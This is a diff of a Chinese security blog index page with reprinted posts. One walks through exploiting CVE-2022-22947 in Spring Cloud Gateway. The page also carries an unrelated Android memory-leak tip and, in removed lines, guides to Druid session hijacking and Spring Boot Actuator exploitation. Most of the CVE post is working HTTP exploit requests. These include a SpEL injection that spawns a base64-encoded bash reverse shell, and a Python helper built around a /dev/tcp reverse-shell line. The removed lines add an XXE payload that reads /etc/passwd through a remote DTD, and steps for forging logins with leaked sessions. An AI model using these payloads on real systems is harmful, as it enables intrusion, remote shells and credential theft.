+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/2.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>第三，发送以下请求以检索结果：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/3.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>查看所有路由</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span> 123.58.236.76:40279</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/4.png" alt="image"> </p>
+</blockquote>
+<blockquote>
+<p>最后，发送一个 DELETE 请求来删除我们的恶意路由器：</p>
+</blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/actuator/gateway/routes/lyy9</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:40279</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/5.png" alt="image"><br>删除后用记得也用refresh</p>
+</blockquote>
+<h2><span id="反弹shell">反弹shell</span></h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">&#123;</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="string">\&quot;bash</span> -c &#123;echo,反弹shellbase64&#125;</span>|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).getInputStream()))&#125;&quot;</span></span></span><br><span class="line"><span class="language-livescript">    &#125;</span></span><br><span class="line"><span class="language-livescript">  &#125;],</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span></span></span><br><span class="line"><span class="language-livescript">&#125;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>删去new String[]初始化，直接将base64的反弹shell命令放入填入<br>生成base64那个站点崩了，可以自己写个python</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64_str = <span class="built_in">input</span>(<span class="string">&quot;请输入反弹shell命令,如：bash -i  &gt;&amp;  /dev/tcp/11.11.11.11/2334 0&gt;&amp;1\n&quot;</span>)</span><br><span class="line">res = base64.b64encode(base64_str.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bash -c &#123;echo,&quot;</span>+res.decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行<br>如果想要深入学习SpEL表达式可以参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">Mi1k7ea师傅的文章</a></p>
+</blockquote>
+<blockquote>
+<p>首先定位到漏洞的修复版本对比<br><code>https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e</code><br><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/6.png" alt="image"><br>可以看到删除了默认的StandardEvaluationContext，改用自定义的GatewayEvaluationContext来对表达式进行SpEL进行处理</p>
+<p>默认的StandardEvaluationContext里getValue方法</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)</span> &#123;</span><br><span class="line">	Object value;</span><br><span class="line">	<span class="type">String</span> <span class="variable">rawValue</span> <span class="operator">=</span> entryValue;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span>) &#123;</span><br><span class="line">		rawValue = rawValue.trim();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span> &amp;&amp; rawValue.startsWith(<span class="string">&quot;#&#123;&quot;</span>) &amp;&amp; entryValue.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">		<span class="comment">// assume it&#x27;s spel</span></span><br><span class="line">		<span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">		context.setBeanResolver(<span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(beanFactory));</span><br><span class="line">		<span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(entryValue, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>());</span><br><span class="line">		value = expression.getValue(context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		value = entryValue;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以控制 getValue 方法调用,那么就能调用任何有效的表达式达到注入效果</p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
+<p>3.1.x用户应升级到3.1.1+<br>3.0.x用户应升级到3.0.7+<br>如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用<br>如果需要Actuator端点，则应使用Spring Security对其进行保护</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/10/25/Android-Leaks/">
+                android使用Leaks检测内存泄漏
+            </a>
+        </h2>
+    
+    <time>
+        Oct 25, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android使用leaks检测内存泄漏">android使用Leaks检测内存泄漏</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/fancy_xty/article/details/51595313">浅浅清风</a> 并作补充</p>
+</blockquote>
+<h2><span id="leaks-内存泄漏检测工具使用">Leaks 内存泄漏检测工具使用</span></h2><blockquote>
+<p>网址:<a target="_blank" rel="noopener" href="https://github.com/square/leakcanary">https://github.com/square/leakcanary</a><br>在你的module中添加依赖</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android:1.4-beta2&#x27;</span></span><br><span class="line">releaseCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br><span class="line">testCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Application中添加: <code>LeakCanary.install(this);</code></p>
+</blockquote>
+<blockquote>
+<p>并且确保你的app处于调试模式，如下图:</p>
+<p><img src="/2023/10/25/Android-Leaks/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>当切换到release版本的时候,leakcanary-debug不会被打包.所以切换到release之后不用对leakcanary做注释或者删除等操作.<br>现在就可以开始使用了,重新编译你的工程,运行在模拟器或真机上.<br>在各个页面中测试,如果存在内存泄漏的情况,leaks会弹出通知提醒你查看.<br>在leaks中会有详细的泄漏说明，如产生内存泄漏的大小，产生内存泄漏的页面和相关的信息。</p>
+<p><img src="/2023/10/25/Android-Leaks/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>内存泄漏详情：</p>
+<p><img src="/2023/10/25/Android-Leaks/3.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p>最后有一些关于内存泄漏的建议:<br>为了避免上下文相关的内存泄漏,记住以下几点:<br>不要长期引用context-activity(引用一个活动应该有相同的生命周期活动本身)<br>使用getApplicationContext而不是context或activity试试<br>避免非静态内部类的一个活动如果你不控制自己的生命周期,使用静态内部类,让一个弱引用来传递,并且记住,垃圾收集器对于内存泄漏并不保险。</p>
+</blockquote>
+<blockquote>
+<p>下面说几个作者遇到的内存泄漏的情况以及解决方案:<br>使用百度地图LocationClient.在Activity被销毁时调用</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mLocClient != <span class="literal">null</span>)&#123;</span><br><span class="line">            mLocClient.unRegisterLocationListener(myListener);</span><br><span class="line">            mLocClient.stop();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>使用友盟分享登录时, 传递getApplicationContext<br>第三方库如果需要传入Activity的时候，传递一个弱引用进去， 可以避免内存泄漏,如下：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference&lt;HomeActivity&gt; reference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>(getActivity());</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ShareAction</span>(reference.get()).setDisplayList(displaylist);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>在Handler中容易造成内存泄漏，最好使用弱引用方式，要么，在Activity销毁的时候清空所有的handler栈。</p>
+<p>在使用WebView的时候也可能出现内存泄漏，解决办法，我的<a target="_blank" rel="noopener" href="http://blog.csdn.net/fancy_xty/article/details/51595697">另一篇博客</a>里有详细讲解。</p>
+<p>在使用RxJava的时候也可能会出现内存泄漏，可以使用RxLifecycler来解决。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Leaks/" rel="tag">Leaks</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/10/25/MPS-2022-60494-YApi/">
                 YApi命令执行漏洞（MPS-2022-60494）安全风险通告
             </a>
@@ -317,461 +765,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/CORS/" rel="tag">CORS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/06/Druid-Session/">
-                Druid未授权访问利用
-            </a>
-        </h2>
-    
-    <time>
-        Oct 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="druid未授权访问利用">Druid未授权访问利用</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/chest_/article/details/109695524">春日野穹</a> 并作补充</p>
-</blockquote>
-<h2><span id="引言">引言</span></h2><blockquote>
-<p>最近挖SRC经常遇到Druid未授权访问漏洞，觉得过程比较有趣，所以简单记录一下</p>
-</blockquote>
-<h2><span id="druid简介">Druid简介</span></h2><blockquote>
-<p>druid是阿里研发的一款数据库连接池，其开发语言为java，druid集合了c3p0、dbcp、proxool等连接池的优点，还加入了日志监控、session监控等数据监控功能，使用Druid能有效的监控DB池连接和SQL的执行情况。<br>更多信息可参考官方GitHub项目：<a target="_blank" rel="noopener" href="https://github.com/alibaba/druid">https://github.com/alibaba/druid</a><br>druid虽高效好用，但当开发者配置不当时就可能造成未授权访问，攻击者可利用泄露的Session登录后台</p>
-</blockquote>
-<h2><span id="druid未授权访问路径">Druid未授权访问路径</span></h2><blockquote>
-<p>怎么探寻Druid未授权访问呢？可以直接拼接以下路径进行访问，如果页面存在，即为Druid未授权访问</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">html:</span><br><span class="line">ip/druid/index.html 		 	##Druid Index</span><br><span class="line">ip/druid/sql.html				##Druid sql监控页面</span><br><span class="line">ip/druid/weburi.html			##Druid Web URI监控页面</span><br><span class="line">ip/druid/websession.html		##Druid Web Session监控页面</span><br><span class="line"></span><br><span class="line">json:</span><br><span class="line">ip/druid/weburi.json			##Druid Web URI json</span><br><span class="line">ip/druid/websession.json		##Druid Web Session json</span><br><span class="line"></span><br><span class="line">Druid 登录接口：</span><br><span class="line">ip/druid/login.html				##Druid登录认证页面</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>当一级目录不存在时，可尝试拼接二级目录进行访问<br>也可利用谷歌语法或目录扫描工具进行探测：<br><img src="/2023/10/06/Druid-Session/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="提取session">提取session</span></h2><blockquote>
-<p>访问ip&#x2F;druid&#x2F;weburi.html看到以下页面则证明漏洞可被利用，如果url和session页面都为空，则说明这两项druid并不管理<br><img src="/2023/10/06/Druid-Session/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>当&#x2F;druid&#x2F;websession.html页面存在数据时，我们可利用该页面的session伪造登录，点击最后访问时间，然后复制一条离现在时间最为接近的session进行伪造登录；之所以要点击最后访问时间排序session，是因为此处记录的Session并非全部都是用户在线时的session，当用户退出系统时，session虽然还存在，但已失效，无法再利用。<br>也可利用py提取session然后结合burp的Intruder模块批量遍历高权限用户，session地址可参考上面给出的链接<br><img src="/2023/10/06/Druid-Session/3.png" alt="image"></p>
-<p>如果我们并不清楚后台的位置，我们可再把脚本改一下，利用url监控处为我们提供清晰的站点目录架构<br><img src="/2023/10/06/Druid-Session/4.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>ok，得到后台地址，接下来我们访问一下<br><img src="/2023/10/06/Druid-Session/5.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>重新刷新一下页面，然后开启burp进行抓包，抓包过程中发现站点cookie值存在session字段，点击最后访问时间排序一下session，随后复制session过来访问一下<br><img src="/2023/10/06/Druid-Session/6.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>毫无意外，成功进去，但是权限不高，看来还是得开启神奇的Intruder模块，爆破结果如下<br><img src="/2023/10/06/Druid-Session/7.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>根据返回包信息看哪条session权限高就用它伪造登录<br>注：除session伪造外，url监控和sql监控也能为我们开拓攻击的思路，当我们遇到一个注入且不清楚其语法结构时，查看sql监控处有可能会得到，此外，url监控处也为我们提供了较为清晰的站点目录架构</p>
-</blockquote>
-<h2><span id="session伪造进后台">session伪造进后台</span></h2><blockquote>
-<p>之后就是替换cookie值伪造登录了，f12改一下session值即可<br><img src="/2023/10/06/Druid-Session/8.png" alt="image"></p>
-</blockquote>
-<h2><span id="结语">结语</span></h2><blockquote>
-<p>druid作为数据源的一名后起之秀，凭借其出色的性能，渐渐被大家使用。当然还有他的监控页面也有这非常大的作用。但是监控页面往往包含了很多隐私的数据信息，所以需要将其保密，可以为监控页面添加一个用户名和密码，确保其安全性</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Druid/" rel="tag">Druid</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/06/Spring-Boot-Actuator-RCE/">
-                Spring Boot Actuator 漏洞利用
-            </a>
-        </h2>
-    
-    <time>
-        Oct 6, 2023
-    </time>
-    <section class="content">
-        <h1><span id="spring-boot-actuator-漏洞利用">Spring Boot Actuator 漏洞利用</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/234266.html">诺言</a> 并作补充</p>
-</blockquote>
-<h2><span id="前言">前言</span></h2><blockquote>
-<p>Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。</p>
-</blockquote>
-<h2><span id="漏洞发现">漏洞发现</span></h2><blockquote>
-<p>通常通过两个位置判断网站是否使用了Spring Boot框架。<br>1、网站图片文件是一个绿色的树叶。<br>2、特有的报错信息。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/1.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="影响版本">影响版本</span></h2><blockquote>
-<p>Spring Boot &lt; 1.5 默认未授权访问所有端点<br>Spring Boot &gt;&#x3D; 1.5 默认只允许访问&#x2F;health和&#x2F;info端点，但是此安全性通常被应用程序开发人员禁用</p>
-</blockquote>
-<h2><span id="端点描述">端点描述</span></h2><blockquote>
-<p>官方文档对每个端点的功能进行了描述。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">路径            描述</span><br><span class="line">/autoconfig    提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过</span><br><span class="line">/beans         描述应用程序上下文里全部的Bean，以及它们的关系</span><br><span class="line">/env           获取全部环境属性</span><br><span class="line">/configprops   描述配置属性(包含默认值)如何注入Bean</span><br><span class="line">/dump          获取线程活动的快照</span><br><span class="line">/health        报告应用程序的健康指标，这些值由HealthIndicator的实现类提供</span><br><span class="line">/info          获取应用程序的定制信息，这些信息由info打头的属性提供</span><br><span class="line">/mappings      描述全部的URI路径，以及它们和控制器(包含Actuator端点)的映射关系</span><br><span class="line">/metrics       报告各种应用程序度量信息，比如内存用量和HTTP请求计数</span><br><span class="line">/shutdown      关闭应用程序，要求endpoints.shutdown.enabled设置为<span class="literal">true</span></span><br><span class="line">/trace         提供基本的HTTP请求跟踪信息(时间戳、HTTP头等)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>Spring Boot 1.x版本端点在根URL下注册。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/2.jpg" alt="image"></p>
-<p>Spring Boot 2.x版本端点移动到&#x2F;actuator&#x2F;路径。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/3.jpg" alt="image"></p>
-<p>本文中端点的位置都是基于网站根目录下，实战中遇到的情况是，端点可能存放在多级目录下，需要自行进行寻找。<br>访问&#x2F;trace端点获取到近期服务器收到的请求信息。<br>如果存在登录用户的操作请求，可以伪造cookie进行登录。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/4.jpg" alt="image"></p>
-<p>访问&#x2F;env端点获取环境属性。<br>数据库账户泄漏<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/5.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="jolokia端点利用">Jolokia端点利用</span></h2><blockquote>
-<p>大多数Actuator仅支持GET请求并仅显示敏感的配置数据,如果使用了不当的Jolokia端点，可能会产生XXE、甚至是RCE安全问题。</p>
-</blockquote>
-<h2><span id="reloadbyurl方法">reloadByURL方法</span></h2><blockquote>
-<p>查看&#x2F;jolokia&#x2F;list 中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/6.jpg" alt="image"></p>
-</blockquote>
-<h3><span id="xxe漏洞实现">xxe漏洞实现</span></h3><blockquote>
-<p>reloadByURL方法，允许远程加载logback.xml 配置文件，并且解析 xml 文件未做任何过滤措施，导致了xxe漏洞。<br>1、创建logback.xml和fileread.dtd文件</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">logback.xml,地址为公网vpsweb服务地址。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [ <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://x.x.x.x/fileread.dtd&quot;</span>&gt;</span>%remote;%int;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="symbol">&amp;trick;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fileread.dtd</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!ENTITY % d <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">int</span> <span class="string">&quot;&lt;!ENTITY trick SYSTEM &#x27;:%d;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
